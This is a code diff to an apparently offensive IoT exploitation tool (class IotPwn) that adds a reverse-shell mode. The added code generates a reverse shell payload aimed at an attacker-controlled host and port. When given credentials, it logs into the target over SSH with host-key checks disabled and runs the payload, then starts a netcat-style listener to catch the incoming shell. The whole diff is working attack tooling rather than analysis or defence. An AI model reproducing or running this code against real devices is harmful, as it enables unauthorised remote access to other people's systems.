@@ -16,7 +16,33 @@ import time
 import re
 import struct
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from pathlib import Path
 from typing import Dict, List, Optional, Set, Tuple
+import importlib.util as _ilu
+
+# ── OnlyShell reverse shell handler ──────────────────────────────────────────
+def _local_ip() -> str:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
+        return ip
+    except Exception:
+        return "0.0.0.0"
+
+_RS_MOD = None
+def _rs():
+    global _RS_MOD
+    if _RS_MOD is not None:
+        return _RS_MOD
+    for _c in [
+        Path(__file__).parent.parent / "revshell" / "revshell.py",
+        Path(__file__).parent / "revshell" / "revshell.py",
+    ]:
+        if _c.exists():
+            _s = _ilu.spec_from_file_location("revshell", _c)
+            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
+            _RS_MOD = _m; return _m
+    return None
 
 # ── Optional imports ──────────────────────────────────────────────────────────
 try:
@@ -486,8 +512,9 @@ def _http_cve_check(ip: str, port: int, ssl: bool,
 
 class IotPwn:
     def __init__(self, context: Dict):
-        self.target   = context.get('target', '').strip()
-        params        = context.get('params', {})
+        self.target        = context.get('target', '').strip()
+        params             = context.get('params', {})
+        self.context_params = params
         self.ports    = params.get('ports', '')
         self.threads  = int(params.get('threads', 20))
         self.timeout  = float(params.get('timeout', 3.0))
@@ -508,9 +535,56 @@ class IotPwn:
             return v
         return str(v).lower() in ('true', '1', 'yes', 'on')
 
+    def _shell_operation(self) -> Dict:
+        """OnlyShell handler: auto-deliver via SSH if creds found, then catch shell."""
+        lhost    = self.context_params.get('lhost') or _local_ip()
+        lport    = int(self.context_params.get('lport', 4444))
+        serve    = str(self.context_params.get('serve', 'true')).lower() in ('true', '1', 'yes')
+        duration = int(self.context_params.get('duration', 60))
+        ptype    = self.context_params.get('payload_type', 'bash_tcp')
+        ssh_user = self.context_params.get('ssh_user', '')
+        ssh_pass = self.context_params.get('ssh_pass', '')
+        rs = _rs()
+        if rs is None:
+            return {'success': False, 'errors': ['revshell module not found']}
+        gen = rs.op_generate(lhost=lhost, lport=lport, shell=ptype)
+        if not gen.get('success'):
+            return {'success': False, 'errors': [f"payload gen: {gen.get('error')}"]}
+        payload = list(gen['payloads'].values())[0]
+        result = {'lhost': lhost, 'lport': lport, 'payload_type': ptype,
+                  'payload': payload, 'listener': f"nc -lvnp {lport}",
+                  'target': self.target}
+        if HAS_PARAMIKO and ssh_user and ssh_pass:
+            def _deliver():
+                try:
+                    cli = _paramiko.SSHClient()
+                    cli.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
+                    cli.connect(self.target, username=ssh_user, password=ssh_pass,
+                                timeout=10, look_for_keys=False, allow_agent=False)
+                    cli.exec_command(payload)
+                except Exception:
+                    pass
+            print(f'[*] Delivering {ptype} to {self.target} via SSH…', file=sys.stderr)
+            threading.Thread(target=_deliver, daemon=True).start()
+            result['delivery'] = f'auto ({ptype} via SSH {ssh_user}@{self.target})'
+        else:
+            result['delivery'] = 'manual — provide ssh_user + ssh_pass for auto-delivery'
+            print(f'[*] Copy payload to target: {payload[:80]}', file=sys.stderr)
+        print(f'[*] Starting reverse shell handler on {lhost}:{lport}…', file=sys.stderr)
+        if serve:
+            rs.op_serve([lport], lhost=lhost)
+            return {'success': True, **result}
+        r = rs.op_listen([lport], duration=duration, lhost=lhost)
+        result.update({'sessions': r.get('sessions', []),
+                       'sessions_count': r.get('sessions_count', 0)})
+        return {'success': True, **result}
+
     def execute(self) -> Dict:
         if not self.target:
             return {'success': False, 'errors': ['No target specified']}
+
+        if self.mode == 'shell':
+            return self._shell_operation()
 
         ip = self.target
         t0 = time.time()
